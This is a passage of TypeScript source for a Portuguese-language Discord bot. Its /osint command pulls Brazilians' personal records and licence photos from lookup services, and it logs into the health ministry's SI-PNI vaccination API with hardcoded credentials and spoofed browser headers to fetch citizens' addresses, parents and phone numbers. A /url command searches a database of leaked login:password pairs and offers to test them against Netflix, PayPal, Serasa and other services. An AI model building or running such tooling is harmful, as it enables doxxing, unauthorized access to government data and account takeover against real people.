                : "SKYNETchat não retornou resposta. O cookie pode estar expirado ou a API offline.\nUse `/sky status` para diagnosticar."
            )
            .setFooter({ text: `${AUTHOR}  •  ${modelLabel}  •  ${elapsed}ms` })
            .setTimestamp(),
        ],
      });
      return;
    }

    // ── Build final response embed(s) ────────────────────────────────────────
    const CHUNK = 3800;
    const chunks: string[] = [];
    let remaining = reply;
    while (remaining.length > 0) {
      chunks.push(remaining.slice(0, CHUNK));
      remaining = remaining.slice(CHUNK);
    }

    const embeds = chunks.map((chunk, i) => {
      const embed = new EmbedBuilder().setColor(COLORS.PURPLE);
      if (i === 0) {
        embed
          .setTitle("🛰️  S K Y N E T C H A T")
          .setDescription(
            `> 💬 **${qPreview}**\n` +
            `\u200b\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `\u200b\n` +
            chunk
          )
          .setThumbnail("attachment://geass-symbol.png");
      } else {
        embed.setDescription(chunk);
      }
      if (i === chunks.length - 1) {
        embed.setFooter({ text: `${AUTHOR}  •  ${modelLabel}  •  ${elapsed}ms` }).setTimestamp();
      }
      return embed;
    });

    await safeEdit({ embeds, files: [geassFile] });
  }
}

// ── /osint — External OSINT lookup via GeassZero + DarkFlow + SIPNI ──────────
const GEASS_ZERO_BASE = "http://149.56.18.68:25584/api/consulta";
const GEASS_ZERO_KEY  = "HydraZero";
const DARKFLOW_TOKEN  = process.env.DARKFLOW_TOKEN ?? "KEVINvQUCvPrDSob5q437uC36MPubhxa";
const DARKFLOW_BASE   = "https://darkflowapis.space/api.php";

// ── SIPNI (servicos-cloud.saude.gov.br) ───────────────────────────────────────
const SIPNI_USER   = "proxy867387611";
const SIPNI_PASS   = "sipni76040";
const SIPNI_B64    = Buffer.from(`${SIPNI_USER}:${SIPNI_PASS}`).toString("base64");
const SIPNI_AUTH_URL  = "https://servicos-cloud.saude.gov.br/pni-bff/v1/autenticacao/tokenAcesso";
const SIPNI_QUERY_URL = "https://servicos-cloud.saude.gov.br/pni-bff/v1/cidadao/cpf/";

let sipniToken: string | null = null;
let sipniTokenExpiry = 0;

async function getSipniToken(): Promise<string> {
  if (sipniToken && Date.now() < sipniTokenExpiry) return sipniToken;
  const r = await fetch(SIPNI_AUTH_URL, {
    method:  "POST",
    headers: {
      "X-Authorization":   `Basic ${SIPNI_B64}`,
      "accept":            "application/json",
      "content-length":    "0",
      "User-Agent":        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
      "Origin":            "https://si-pni.saude.gov.br",
      "Referer":           "https://si-pni.saude.gov.br/",
      "Accept-Language":   "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
    },
    signal: AbortSignal.timeout(15_000),
  });
  const j = await r.json() as { accessToken?: string; access_token?: string };
  const tok = j.accessToken ?? j.access_token ?? "";
  if (!tok) throw new Error("SIPNI auth falhou — sem token na resposta");
  sipniToken = tok;
  // Decode JWT expiry (exp claim) or default to 4h
  try {
    const payload = JSON.parse(Buffer.from(tok.split(".")[1], "base64url").toString()) as { exp?: number };
    sipniTokenExpiry = payload.exp ? payload.exp * 1000 - 60_000 : Date.now() + 4 * 3600_000;
  } catch { sipniTokenExpiry = Date.now() + 4 * 3600_000; }
  return tok;
}

interface SipniRecord {
  nome?: string; dataNascimento?: string; sexo?: string;
  nomeMae?: string; nomePai?: string; grauQualidade?: string;
  ativo?: boolean; obito?: boolean; partoGemelar?: boolean; vip?: boolean;
  racaCor?: { codigo?: string; descricao?: string };
  telefone?: string;
  nacionalidade?: { codigo?: string; descricao?: string };
  endereco?: {
    cep?: string; logradouro?: string; numero?: string;
    complemento?: string; bairro?: string;
    municipio?: { codigo?: string; nome?: string };
    uf?: { codigo?: string; sigla?: string; nome?: string };
  };
}

async function fetchSipniData(cpf: string): Promise<SipniRecord> {
  const token = await getSipniToken();
  const r = await fetch(`${SIPNI_QUERY_URL}${cpf.replace(/\D/g, "")}`, {
    headers: {
      "Authorization":  `Bearer ${token}`,
      "Accept":         "application/json, text/plain, */*",
      "User-Agent":     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
      "Origin":         "https://si-pni.saude.gov.br",
      "Referer":        "https://si-pni.saude.gov.br/",
      "Accept-Language": "pt-BR,pt;q=0.9",
    },
    signal: AbortSignal.timeout(15_000),
  });
  if (r.status === 401) {
    // Token expired — force refresh and retry once
    sipniToken = null;
    sipniTokenExpiry = 0;
    return fetchSipniData(cpf);
  }
  const j = await r.json() as { records?: SipniRecord[]; error?: string };
  if (!j.records || j.records.length === 0) throw new Error(j.error ?? "CPF não encontrado no SIPNI");
  return j.records[0];
}

function buildSipniEmbed(cpf: string, d: SipniRecord): EmbedBuilder {
  const sexoMap: Record<string, string> = { M: "Masculino", F: "Feminino", I: "Ignorado" };
  const sexo    = d.sexo ? (sexoMap[d.sexo] ?? d.sexo) : null;
  const ender   = d.endereco;
  const cidade  = ender?.municipio?.nome ?? null;
  const uf      = ender?.uf?.sigla ?? null;

  const embed = new EmbedBuilder()
    .setColor(0x22c55e)
    .setAuthor({ name: "💉  OSINT — SIPNI (SI-PNI CLOUD)", iconURL: "https://media.tenor.com/9JqFEMlhATIAAAAj/hack-matrix.gif" })
    .setDescription(
      `> 🔎  CPF  **\`${cpf}\`**  •  SI-PNI Cloud API\n` +
      `> ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
    )
    .setThumbnail("https://media.tenor.com/wSMJ9UHO3ZYAAAAC/hacker.gif")
    .setFooter({ text: `${AUTHOR}  •  servicos-cloud.saude.gov.br  •  ${new Date().toLocaleDateString("pt-BR")}` })
    .setTimestamp();

  // 🪪 Identificação / Dados Pessoais
  const idLines: string[] = [];
  if (d.nome)          idLines.push(`├ **NOME**  \`${d.nome}\``);
  if (d.dataNascimento) idLines.push(`├ **NASCIMENTO**  \`${d.dataNascimento}\``);
  if (sexo)            idLines.push(`├ **SEXO**  \`${sexo}\``);
  if (d.racaCor?.descricao) idLines.push(`├ **RAÇA/COR**  \`${d.racaCor.descricao}\``);
  if (d.telefone)      idLines.push(`├ **TELEFONE**  \`${d.telefone}\``);
  if (d.nacionalidade?.descricao) idLines.push(`└ **NACIONALIDADE**  \`${d.nacionalidade.descricao}\``);
  else if (idLines.length) idLines[idLines.length - 1] = idLines[idLines.length - 1].replace("├", "└");
  if (idLines.length) embed.addFields({ name: "🪪  IDENTIFICAÇÃO", value: idLines.join("\n"), inline: false });

  // 👨‍👩‍👧 Família
  const famLines: string[] = [];
  if (d.nomeMae) famLines.push(`├ **MÃE**  \`${d.nomeMae}\``);
  if (d.nomePai) famLines.push(`└ **PAI**  \`${d.nomePai}\``);
  else if (famLines.length) famLines[famLines.length - 1] = famLines[famLines.length - 1].replace("├", "└");
  if (famLines.length) embed.addFields({ name: "👨‍👩‍👧  FAMÍLIA", value: famLines.join("\n"), inline: false });

  // 📍 Endereço
  if (ender) {
    const addrLines: string[] = [];
    if (ender.logradouro) addrLines.push(`├ **RUA**  \`${ender.logradouro}${ender.numero ? ", " + ender.numero : ""}\``);
    if (ender.complemento && ender.complemento.trim()) addrLines.push(`├ **COMPLEMENTO**  \`${ender.complemento}\``);
    if (ender.bairro) addrLines.push(`├ **BAIRRO**  \`${ender.bairro}\``);
    if (cidade)      addrLines.push(`├ **CIDADE**  \`${cidade}${uf ? " — " + uf : ""}\``);
    if (ender.cep)   addrLines.push(`└ **CEP**  \`${ender.cep}\``);
    else if (addrLines.length) addrLines[addrLines.length - 1] = addrLines[addrLines.length - 1].replace("├", "└");
    if (addrLines.length) embed.addFields({ name: "📍  LOCALIZAÇÃO", value: addrLines.join("\n"), inline: false });
  }

  // ℹ️ Status
  const flags: string[] = [];
  if (d.ativo === false)        flags.push("🔴 Inativo");
  if (d.ativo === true)         flags.push("🟢 Ativo");
  if (d.obito === true)         flags.push("💀 Óbito");
  if (d.partoGemelar === true)  flags.push("👬 Parto Gemelar");
  if (d.vip === true)           flags.push("⭐ VIP");
  if (d.grauQualidade)          flags.push(`📊 Qualidade: \`${d.grauQualidade}\``);
  if (flags.length) embed.addFields({ name: "ℹ️  STATUS", value: flags.join("  •  "), inline: false });

  return embed;
}

const OSINT_META: Record<string, { label: string; emoji: string; color: number }> = {
  cpf:      { label: "CPF",            emoji: "🪪", color: 0x4ade80 },
  nome:     { label: "NOME",           emoji: "👤", color: 0x60a5fa },
  telefone: { label: "TELEFONE",       emoji: "📱", color: 0xf59e0b },
  placa:    { label: "PLACA",          emoji: "🚗", color: 0xef4444 },
  cep:      { label: "CEP",            emoji: "📍", color: 0xa78bfa },
  cnpj:     { label: "CNPJ",           emoji: "🏢", color: 0x34d399 },
  email:    { label: "EMAIL",          emoji: "📧", color: 0xfbbf24 },
  pix:      { label: "PIX",            emoji: "💰", color: 0x10b981 },
  cnh:      { label: "CNH",            emoji: "🚙", color: 0xf97316 },
  rg:       { label: "RG",             emoji: "🪪", color: 0x818cf8 },
  renavam:  { label: "RENAVAM",        emoji: "🔢", color: 0xec4899 },
  chassi:   { label: "CHASSI",         emoji: "⚙️", color: 0x94a3b8 },
  pai:      { label: "NOME DO PAI",    emoji: "👨", color: 0x6ee7b7 },
  mae:      { label: "NOME DA MÃE",    emoji: "👩", color: 0xfda4af },
  obito:    { label: "ÓBITO",          emoji: "💀", color: 0x6b7280 },
  foto:     { label: "FOTO CNH BR",    emoji: "📸", color: 0xf472b6 },
  sipni:    { label: "SIPNI (VACINAS)", emoji: "💉", color: 0x22c55e },
};

// Known field names sorted by length (longest first) for reliable matching
const OSINT_KNOWN_FIELDS = [
  // Long/multi-word first
  "QUANTIDADE DE FUNCIONÁRIOS", "DATA SITUAÇÃO CADASTRAL", "SITUAÇÃO CADASTRAL",
  "STATUS NA RECEITA", "MUNICÍPIO DE NASCIMENTO", "TIPO SANGÚINEO",
  "PROPRIETARIO_NOME", "PROPRIETARIO_CPF", "HABILITADO_PARA_DIRIGIR",
  "NATUREZA JURÍDICA", "DATA FUNDAÇÃO", "CPF REPRESENTANTE",
  "ESTADO_ENDERECO", "ESTADO CIVIL", "CLASSE SOCIAL", "MARCA_MODEL0",
  "TIPO_VEICULO", "TIPO DE EMPRESA", "ANO_FABRICACAO", "ANO_MODELO",
  "NOME FANTASIA", "NOME MÃE", "NOME PAI", "RAZÃO SOCIAL",
  "RECEBE INSS", "CPF_CNPJ", "NASCIMENTO", "ESCOLARIDADE", "PROFISSÃO",
  "CAPITAL SOCIAL", "COMBUSTIVEL", "CATEGORIA", "SITUACAO", "RENAVAM",
  "CHASSI", "MOTOR", "MULTAS", "SEGURO", "SERVICO", "LICENCIAMENTO",
  "IPVA", "ESTADO", "COMPLEMENTO", "NUMERO", "BAIRRO", "CIDADE",
  "CNPJ", "EMAIL", "SCORE", "RENDA", "SEXO", "RAÇA", "ÓBITO", "NOME",
  "PLACA", "TITULO ELEITOR", "CPF", "CEP", "RUA", "UF", "RG",
  "PIS", "NIS", "CNS", "COR", "MAE", "PAI", "RAMO", "RISCO",
].sort((a, b) => b.length - a.length);

// ── Parser: ⎯ format (CPF, PLACA, CEP, NOME, CNPJ…) ─────────────────────────
function parseGeassResposta(raw: string): Array<[string, string]> {
  const escaped = OSINT_KNOWN_FIELDS.map(f => f.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"));
  const rx = new RegExp(`(${escaped.join("|")}) ⎯ `, "g");
  const matches: Array<{ key: string; start: number; vStart: number }> = [];
  let m: RegExpExecArray | null;
  while ((m = rx.exec(raw)) !== null) {
    matches.push({ key: m[1], start: m.index, vStart: m.index + m[0].length });
  }
  const pairs: Array<[string, string]> = [];
  for (let i = 0; i < matches.length; i++) {
    const { key, start, vStart } = matches[i];
    const end = i + 1 < matches.length ? matches[i + 1].start : raw.length;
    pairs.push([key, raw.slice(vStart, end).trimEnd()]);
  }
  return pairs;
}

// ── Parser: BASE N format (TELEFONE, EMAIL…) ──────────────────────────────────
interface BaseRecord { cpf: string; nome: string; nascimento?: string; email?: string }
function parseBaseFormat(raw: string): BaseRecord[] {
  const records: BaseRecord[] = [];
  // Match "BASE N CPF: XXXX NOME: YYYY" blocks
  const baseRx = /BASE\s+\d+\s+CPF:\s*`?([^\s`]+?)`?\s+NOME:\s*([\s\S]*?)(?=BASE\s+\d+|$)/g;
  let bm: RegExpExecArray | null;
  while ((bm = baseRx.exec(raw)) !== null) {
    const cpf   = bm[1].replace(/`/g, "").trim();
    const block = bm[2].trim();
    const nasc  = /NASCIMENTO:\s*([^\s]+)/.exec(block);
    const mail  = /EMAIL:\s*([^\s]+)/.exec(block);
    const nome  = block.replace(/NASCIMENTO:.*|EMAIL:.*/g, "").trim();
    records.push({ cpf, nome, nascimento: nasc?.[1], email: mail?.[1] });
  }
  return records;
}

// ── Group ⎯-format pairs into per-record maps (handles multi-person results) ──
function groupGeassRecords(pairs: Array<[string, string]>): Array<Map<string, string>> {
  const records: Array<Map<string, string>> = [];
  let cur = new Map<string, string>();
  const RECORD_STARTERS = new Set(["CPF", "CNPJ", "PLACA", "CHASSI"]);
  for (const [k, v] of pairs) {
    if (RECORD_STARTERS.has(k) && cur.has(k)) {
      records.push(cur);
      cur = new Map<string, string>();
    }
    cur.set(k, v);
  }
  if (cur.size > 0) records.push(cur);
  return records;
}

function parseSections(raw: string): Array<{ name: string; count: number; items: string[] }> {
  const rx = /([A-ZÁÀÂÃÉÊÍÓÔÕÚÜÇ]+(?:\s[A-ZÁÀÂÃÉÊÍÓÔÕÚÜÇ]+)*):\s*\(\s*(\d+)\s*-\s*[Ee]ncontrados?\)([\s\S]*?)(?=(?:[A-ZÁÀÂÃÉÊÍÓÔÕÚÜÇ]+(?:\s[A-ZÁÀÂÃÉÊÍÓÔÕÚÜÇ]+)*):|\s*$)/g;
  const sections: Array<{ name: string; count: number; items: string[] }> = [];
  let sm: RegExpExecArray | null;
  while ((sm = rx.exec(raw)) !== null) {
    const items = sm[3].split(/\s*•\s*/).map(s => s.trim()).filter(Boolean);
    sections.push({ name: sm[1], count: parseInt(sm[2]), items });
  }
  return sections;
}

const OSINT_FIELD_GROUPS = [
  {
    name: "🪪  IDENTIFICAÇÃO",
    fields: ["CPF", "RG", "NIS", "PIS", "CNS", "TITULO ELEITOR", "PLACA", "CHASSI", "RENAVAM", "CNPJ", "MAE", "PAI"],
  },
  {
    name: "👤  DADOS PESSOAIS",
    fields: ["NOME", "SEXO", "NASCIMENTO", "ESTADO CIVIL", "RAÇA", "TIPO SANGÚINEO", "PROFISSÃO", "ESCOLARIDADE", "RECEBE INSS", "ÓBITO", "STATUS NA RECEITA", "CLASSE SOCIAL", "SCORE", "RENDA"],
  },
  {
    name: "👨‍👩‍👧  FAMÍLIA",
    fields: ["NOME MÃE", "NOME PAI", "MUNICÍPIO DE NASCIMENTO"],
  },
  {
    name: "📍  LOCALIZAÇÃO",
    fields: ["CEP", "RUA", "NUMERO", "COMPLEMENTO", "BAIRRO", "CIDADE", "UF", "ESTADO", "ESTADO_ENDERECO"],
  },
  {
    name: "🚗  VEÍCULO",
    fields: ["SITUACAO", "COR", "COMBUSTIVEL", "CATEGORIA", "TIPO_VEICULO", "ANO_MODELO", "ANO_FABRICACAO", "PROPRIETARIO_NOME", "PROPRIETARIO_CPF", "HABILITADO_PARA_DIRIGIR", "IPVA", "MULTAS", "LICENCIAMENTO", "SEGURO", "MOTOR", "MARCA_MODEL0"],
  },
  {
    name: "🏢  EMPRESA",
    fields: ["RAZÃO SOCIAL", "NOME FANTASIA", "DATA FUNDAÇÃO", "NATUREZA JURÍDICA", "QUANTIDADE DE FUNCIONÁRIOS", "TIPO DE EMPRESA", "CAPITAL SOCIAL", "RAMO", "RISCO", "SITUAÇÃO CADASTRAL", "DATA SITUAÇÃO CADASTRAL", "CPF REPRESENTANTE"],
  },
];

const OSINT_SKIP = new Set(["SEM INFORMAÇÃO", "NÃO INFORMADO", "NÃO", "0", "", "ZONA:", "SECAO:"]);
const OSINT_SECTION_EMOJI: Record<string, string> = {
  EMAILS: "📧", TELEFONES: "📱", ENDERECOS: "🏠", PARENTES: "👨‍👩‍👧",
  VEICULOS: "🚗", EMPREGOS: "💼", EMPRESAS: "🏢", BANCOS: "🏦",
  SOCIOS: "🤝", FUNCIONARIOS: "👥",
};

function buildOsintEmbedFromMap(
  meta: { label: string; emoji: string; color: number },
  dado: string,
  pMap: Map<string, string>,
  allPairs: Array<[string, string]>,
  sections: Array<{ name: string; count: number; items: string[] }>,
  headerExtra?: string,
): EmbedBuilder {
  const usedKs = new Set<string>();

  const embed = new EmbedBuilder()
    .setColor(meta.color)
    .setAuthor({
      name: `${meta.emoji}  OSINT — ${meta.label}`,
      iconURL: "https://media.tenor.com/9JqFEMlhATIAAAAj/hack-matrix.gif",
    })
    .setDescription(
      `> 🔎  Consultando  **\`${dado}\`**${headerExtra ? `  •  ${headerExtra}` : ""}\n` +
      `> ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
    )
    .setThumbnail("https://media.tenor.com/wSMJ9UHO3ZYAAAAC/hacker.gif")
    .setFooter({ text: `${AUTHOR}  •  GeassZero API  •  ${new Date().toLocaleDateString("pt-BR")}` })
    .setTimestamp();

  let fieldCount = 0;

  for (const group of OSINT_FIELD_GROUPS) {
    if (fieldCount >= 20) break;
    const entries: [string, string][] = [];
    for (const f of group.fields) {
      const val = pMap.get(f);
      if (val && val.trim().length > 1 && !OSINT_SKIP.has(val.trim().toUpperCase())) {
        entries.push([f, val.trim()]);
        usedKs.add(f);
      }
    }
    if (entries.length === 0) continue;
    const lines = entries.slice(0, 10).map(([k, v], i, arr) => {
      const tree  = i === arr.length - 1 ? "└" : "├";
      const value = v.length > 72 ? v.slice(0, 70) + "…" : v;
      return `${tree} **${k.replace(/_/g, " ")}**  \`${value}\``;
    });
    embed.addFields({ name: group.name, value: lines.join("\n"), inline: entries.length <= 4 });
    fieldCount++;
  }

  // Remaining fields not in any group
  const extra = allPairs.filter(([k]) => !usedKs.has(k) && k.trim() !== "");
  if (extra.length > 0 && fieldCount < 20) {
    const lines = extra.slice(0, 8).map(([k, v], i, arr) => {
      const tree  = i === arr.length - 1 ? "└" : "├";
      const value = v.length > 72 ? v.slice(0, 70) + "…" : v;
      return `${tree} **${k.replace(/_/g, " ")}**  \`${value}\``;
    });
    embed.addFields({ name: "📋  OUTROS DADOS", value: lines.join("\n"), inline: false });
    fieldCount++;
  }

  if (fieldCount === 0) {
    const fallback = allPairs.slice(0, 15).map(([k, v]) => `**${k}:** \`${v.slice(0, 100)}\``).join("\n");
    embed.addFields({ name: "📄  Dados", value: fallback.slice(0, 1024) || "Sem dados estruturados.", inline: false });
  }

  // Dynamic sections (TELEFONES, ENDERECOS, etc.)
  for (const sec of sections.slice(0, 4)) {
    if (fieldCount >= 23) break;
    const sEmoji = OSINT_SECTION_EMOJI[sec.name] ?? "📋";
    const shown  = sec.items.slice(0, 6).map((it, i, arr) => {
      const tree = i === arr.length - 1 && sec.count <= 6 ? "└" : "├";
      return `${tree} \`${it.replace(/\s+/g, " ").slice(0, 110)}\``;
    });
    if (sec.count > 6) shown.push(`└ *… +${sec.count - 6} mais*`);
    if (shown.length > 0) {
      embed.addFields({ name: `${sEmoji}  ${sec.name}  —  ${sec.count} encontrados`, value: shown.join("\n"), inline: false });
      fieldCount++;
    }
  }

  // Interesses Pessoais
  const allVals = allPairs.map(([, v]) => v).join(" ");
  const intStart = allVals.indexOf("INTERESSES PESSOAIS");
  if (intStart !== -1 && fieldCount < 23) {
    const positives = allVals.slice(intStart + 20).split(/\s*-\s*/).filter(l => l.includes(": Sim")).map(l => `✅ ${l.split(":")[0].trim()}`).slice(0, 10);
    if (positives.length > 0) embed.addFields({ name: "💡  Interesses", value: positives.join("\n"), inline: false });
  }

  return embed;
}

function buildOsintEmbed(
  tipo: string, dado: string,
  kvPairs: Array<[string, string]>,
  sections: Array<{ name: string; count: number; items: string[] }>,
  baseRecords?: BaseRecord[],
): EmbedBuilder {
  const meta = OSINT_META[tipo] ?? { label: tipo.toUpperCase(), emoji: "🔍", color: 0x4ade80 };

  // ── BASE format (TELEFONE, EMAIL) — show as numbered results list ────────────
  if (baseRecords && baseRecords.length > 0) {
    const embed = new EmbedBuilder()
      .setColor(meta.color)
      .setAuthor({
        name: `${meta.emoji}  OSINT — ${meta.label}`,
        iconURL: "https://media.tenor.com/9JqFEMlhATIAAAAj/hack-matrix.gif",
      })
      .setDescription(
        `> 🔎  Consultando  **\`${dado}\`**  •  **${baseRecords.length}** resultados\n` +
        `> ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
      )
      .setThumbnail("https://media.tenor.com/wSMJ9UHO3ZYAAAAC/hacker.gif")
      .setFooter({ text: `${AUTHOR}  •  GeassZero API  •  ${new Date().toLocaleDateString("pt-BR")}` })
      .setTimestamp();

    // Deduplicate by CPF
    const seen = new Set<string>();
    const unique = baseRecords.filter(r => {
      if (seen.has(r.cpf)) return false;
      seen.add(r.cpf);
      return true;
    });

    const lines = unique.slice(0, 15).map((r, i, arr) => {
      const tree  = i === arr.length - 1 ? "└" : "├";
      const nasc  = r.nascimento ? `  •  \`${r.nascimento}\`` : "";
      return `${tree} \`${r.cpf}\`  **${r.nome}**${nasc}`;
    });
    embed.addFields({ name: `🪪  RESULTADOS ENCONTRADOS  (${unique.length} únicos)`, value: lines.join("\n").slice(0, 1024), inline: false });
    if (unique.length > 15) embed.addFields({ name: "⠀", value: `*… +${unique.length - 15} registros adicionais*`, inline: false });
    return embed;
  }

  // ── ⎯ format — group into records, show first in detail ─────────────────────
  const records = groupGeassRecords(kvPairs);

  if (records.length > 1) {
    // First record in detail, others as summary list
    const firstEmbed = buildOsintEmbedFromMap(meta, dado, records[0], kvPairs.slice(0, kvPairs.length), sections, `${records.length} registros`);
    if (records.length > 1) {
      const summaries = records.slice(1, 8).map((r, i) => {
        const nome = r.get("NOME") ?? r.get("RAZÃO SOCIAL") ?? "?";
        const cpf  = r.get("CPF")  ?? r.get("CNPJ") ?? "?";
        const nasc = r.get("NASCIMENTO") ? `  •  \`${r.get("NASCIMENTO")}\`` : "";
        return `├ \`${cpf}\`  **${nome}**${nasc}`;
      });
      if (records.length - 1 > 7) summaries.push(`└ *… +${records.length - 8} mais*`);
      else if (summaries.length > 0) summaries[summaries.length - 1] = summaries[summaries.length - 1].replace("├", "└");
      firstEmbed.addFields({ name: "📋  OUTROS REGISTROS", value: summaries.join("\n").slice(0, 1024), inline: false });
    }
    return firstEmbed;
  }

  // Single record
  const pMap = records[0] ?? new Map(kvPairs.map(([k, v]) => [k, v]));
  return buildOsintEmbedFromMap(meta, dado, pMap, kvPairs, sections);
}

async function handleOsint(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply({ flags: MessageFlags.Ephemeral });

  const tipo = interaction.options.getString("tipo", true);
  const dado = interaction.options.getString("dado", true).trim();
  const meta = OSINT_META[tipo] ?? { label: tipo.toUpperCase(), emoji: "🔍", color: 0x4ade80 };

  // ── SIPNI (servicos-cloud.saude.gov.br) ─────────────────────────────────────
  if (tipo === "sipni") {
    const cpfNum = dado.replace(/\D/g, "");
    if (cpfNum.length !== 11) {
      await interaction.editReply({ embeds: [buildErrorEmbed("💉 SIPNI — CPF INVÁLIDO", "Forneça um CPF válido com 11 dígitos.\n\nEx: `/osint tipo:sipni dado:12345678901`")] });
      return;
    }
    let rec: SipniRecord;
    try {
      rec = await fetchSipniData(cpfNum);
    } catch (e) {
      await interaction.editReply({ embeds: [buildErrorEmbed("💉 SIPNI — SEM RESULTADO", `${String(e).slice(0, 200)}`)] });
      return;
    }
    await interaction.editReply({ embeds: [buildSipniEmbed(cpfNum, rec)] });
    return;
  }

  // ── DarkFlow (Foto CNH BR) ──────────────────────────────────────────────────
  if (tipo === "foto") {
    const cpfNum = dado.replace(/\D/g, "");
    let darkRes: { url?: string; base64?: string; error?: string; status?: number };
    try {
      const r = await fetch(
        `${DARKFLOW_BASE}?token=${DARKFLOW_TOKEN}&modulo=foto_br&consulta=${encodeURIComponent(cpfNum)}`,
        { signal: AbortSignal.timeout(20_000) },
      );
      darkRes = await r.json() as typeof darkRes;
    } catch (e) {
      await interaction.editReply({ embeds: [buildErrorEmbed("ERRO DARKFLOW", String(e).slice(0, 200))] });
      return;
    }
    if (darkRes.error || darkRes.status === 500 || !darkRes.url) {
      await interaction.editReply({ embeds: [buildErrorEmbed("📸 SEM FOTO", darkRes.error ?? "CPF sem foto cadastrada na CNH ou serviço temporariamente indisponível.")] });
      return;
    }
    const embed = new EmbedBuilder()
      .setColor(meta.color)
      .setAuthor({ name: `📸  OSINT — FOTO CNH BR`, iconURL: "https://media.tenor.com/9JqFEMlhATIAAAAj/hack-matrix.gif" })
      .setDescription(`> 🔎  CPF  **\`${cpfNum}\`**\n> ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n*Foto retornada pelo módulo \`foto_br\` — DarkFlow API*`)
      .setImage(darkRes.url)
      .setFooter({ text: `${AUTHOR}  •  DarkFlow API  •  ${new Date().toLocaleDateString("pt-BR")}` })
      .setTimestamp();
    await interaction.editReply({ embeds: [embed] });
    return;
  }

  // ── GeassZero API ───────────────────────────────────────────────────────────
  let resposta: string;
  try {
    const url = `${GEASS_ZERO_BASE}/${tipo}?dados=${encodeURIComponent(dado)}&apikey=${GEASS_ZERO_KEY}`;
    const r   = await fetch(url, { signal: AbortSignal.timeout(18_000) });
    const j   = await r.json() as { status?: string; resposta?: string; error?: string };
    resposta  = (j.resposta ?? j.error ?? "Sem resposta").trim();
  } catch (e) {
    await interaction.editReply({ embeds: [buildErrorEmbed("ERRO DE CONSULTA", `Falha ao conectar à API GeassZero:\n\`${String(e).slice(0, 150)}\``)] });
    return;
  }

  const rLow = resposta.toLowerCase();
  if (rLow.includes("inválido") || rLow.includes("não encontrado") || rLow.includes("nao encontrado") || rLow.includes("verifique")) {
    await interaction.editReply({ embeds: [buildErrorEmbed(`${meta.emoji} SEM RESULTADO`, `Nenhum dado encontrado para **\`${dado}\`**.\n\n*Verifique se o valor está correto e tente novamente.*`)] });
    return;
  }

  // Detect format and parse accordingly
  const isBaseFormat = /BASE\s+\d+\s+CPF:/i.test(resposta);
  const kvPairs      = isBaseFormat ? [] : parseGeassResposta(resposta);
  const sections     = isBaseFormat ? [] : parseSections(resposta);
  const baseRecords  = isBaseFormat ? parseBaseFormat(resposta) : undefined;

  await interaction.editReply({ embeds: [buildOsintEmbed(tipo, dado, kvPairs, sections, baseRecords)] });
}

// ── /url — Credential DB domain search + auto-checker ─────────────────────────
async function handleUrl(interaction: ChatInputCommandInteraction): Promise<void> {
  const callerId   = interaction.user.id;
  const callerName = interaction.user.username;
  if (!isOwner(callerId, callerName) && !isMod(callerId, callerName)) {
    await interaction.reply({
      embeds: [buildErrorEmbed("⛔ ACESSO NEGADO", `**${callerName}** — Apenas owners e admins podem usar o /url.\n\n*"Hydra não é dado a quem não tem força para carregá-lo."*`)],
      flags: MessageFlags.Ephemeral,
    });
    return;
  }

  await interaction.deferReply();

  const domain    = interaction.options.getString("domain", true).trim().toLowerCase().replace(/^https?:\/\//i, "").replace(/\/.*$/, "");
  const targetOpt = (interaction.options.getString("target") ?? "iseek") as string;

  // ── Search credentials DB ──────────────────────────────────────────────────
  let credentials: string[] = [];
  let totalFound = 0;
  try {
    const r = await fetch(`${API_BASE}/api/credentials/search?domain=${encodeURIComponent(domain)}&limit=500`, {
      signal: AbortSignal.timeout(8_000),
    });
    if (!r.ok) throw new Error(`HTTP ${r.status}`);
    const data = await r.json() as { credentials: { login: string; password: string }[]; count: number };
    totalFound   = data.count ?? data.credentials.length;
    credentials  = data.credentials.map((e: { login: string; password: string }) => `${e.login}:${e.password}`);
  } catch (err) {
    await interaction.editReply({
      embeds: [buildErrorEmbed("ERRO DE BUSCA", `Não foi possível buscar no banco de credenciais:\n\`${String(err)}\``)],
    });
    return;
  }

  if (credentials.length === 0) {
    await interaction.editReply({
      embeds: [new EmbedBuilder()
        .setColor(COLORS.ORANGE)
        .setTitle("🔐 URL LOOKUP — SEM RESULTADOS")
        .setDescription(`Nenhuma credencial encontrada para o domínio:\n\`\`\`${domain}\`\`\`\n*Importe credenciais via \`POST /api/credentials/import\` primeiro.*`)
        .setTimestamp()
        .setFooter({ text: AUTHOR })],
    });
    return;
  }

  // ── Show found count + target confirmation buttons ─────────────────────────
  const TARGET_ICONS: Record<string, string> = {
    iseek: "🌐", netflix: "🎬", crunchyroll: "🍥", spotify: "🎵",
    github: "🐙", instagram: "📸", steam: "🔵", roblox: "🎮",
    serasa: "📊", serpro: "🛡️", paypal: "💰", amazon: "📦",
    disney: "🏰", hbomax: "👑",
  };
  const targetIcon  = TARGET_ICONS[targetOpt] ?? "🎯";
  const targetLabel = targetOpt.toUpperCase();

  const confirmRow = new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder()
      .setCustomId(`url_check_${targetOpt}`)
      .setLabel(`${targetIcon} Checar como ${targetLabel}`)
      .setStyle(ButtonStyle.Success),
    new ButtonBuilder()
      .setCustomId("url_cancel")
      .setLabel("✖ Cancelar")
      .setStyle(ButtonStyle.Danger),
  );

  const previewList = credentials.slice(0, 5).map(c => `\`${c.length > 50 ? c.slice(0, 47) + "…" : c}\``).join("\n");

  let replyMsg: import("discord.js").Message;
  try {
    replyMsg = await interaction.editReply({
      embeds: [new EmbedBuilder()
        .setColor(0x00d4ff)
        .setTitle("🔐 URL LOOKUP — CREDENCIAIS ENCONTRADAS")
        .setDescription(
